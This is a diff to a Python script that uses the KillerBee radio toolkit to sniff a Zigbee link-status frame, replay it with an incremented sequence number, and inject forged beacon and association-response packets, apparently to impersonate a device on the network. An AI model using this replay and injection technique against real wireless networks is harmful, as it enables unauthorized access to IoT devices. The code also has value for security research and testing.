@@ -49,7 +49,7 @@ if __name__ == '__main__':
         kb = KillerBee(device=args.devstring)
         kb.set_channel(args.channel)
 
-        link_status_sn = 0
+        link_status_bytes = 0
         link_status_source_bytes = 0
         got_link_status = False
         print('- Listening for link status.')
@@ -61,7 +61,7 @@ if __name__ == '__main__':
                 # Link status: command (b. 1) + link status (b. 25)
                 if (packet_bytes[0] & 0b111 == 0b001 and packet_bytes[25] == 0x08):
                     print(' - Got link status!')
-                    link_status_sn = packet_bytes[2]
+                    link_status_bytes = packet_bytes[:-2]
                     link_status_source_bytes = packet_bytes[17:25]
                     got_link_status = True
         kb.sniffer_off()
@@ -130,6 +130,7 @@ if __name__ == '__main__':
         sniffer_on = False
         got_assoc_request = False
         assoc_request_sequence_num = 0
+        sent_link_status = False
         print('- Listening for beacon / association requests from another device...')
         while not got_assoc_request:
             if not sniffer_on:
@@ -149,6 +150,11 @@ if __name__ == '__main__':
                     beacon_response_bytes[2] = (beacon_response_bytes[2]+1) % 256
                     # Must copy the array before injecting because python lists are pass-by-reference...
                     kb.inject(bytearray(beacon_response_bytes))
+                    if not sent_link_status:
+                        print('  - Replaying link status.')
+                        link_status_bytes[2] = link_status_bytes[2]+1
+                        kb.inject(bytearray(link_status_bytes))
+                        sent_link_status = True
                 # Assoc request
                 elif (packet_bytes[0] & 0b111 == 0b011 and \
                         len(packet_bytes) > 17 and \
@@ -183,7 +189,7 @@ if __name__ == '__main__':
         # Remove FCS
         assoc_request_pkt_bytes = assoc_request_pkt_bytes[:-2]
         # Estimate sequence number as last link status + 5
-        kb.inject(assoc_response_pkt_bytes[0:2] + bytearray([link_status_sn+5]) + assoc_response_pkt_bytes[3:])
+        kb.inject(assoc_response_pkt_bytes[0:2] + bytearray([link_status_bytes[2]+1]) + assoc_response_pkt_bytes[3:])
 
         # ACK data requests and note when data was received
         print('10. Maintaining connection...')
